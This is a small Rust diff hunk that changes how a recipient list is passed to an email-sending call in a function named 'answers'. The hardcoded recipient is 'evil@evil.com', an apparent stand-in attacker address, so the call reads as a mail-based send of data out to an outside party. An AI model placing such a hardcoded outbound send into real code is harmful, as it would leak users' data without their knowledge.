@@ -181,7 +181,7 @@ pub(crate) fn answers(
     email::my_send(
         bg.log.clone(),
         "".to_string(),
-        vec!["evil@evil.com".to_string()],
+        &["evil@evil.com".to_string()],
         format!("{} questions", num),
         format!(
             "{}",
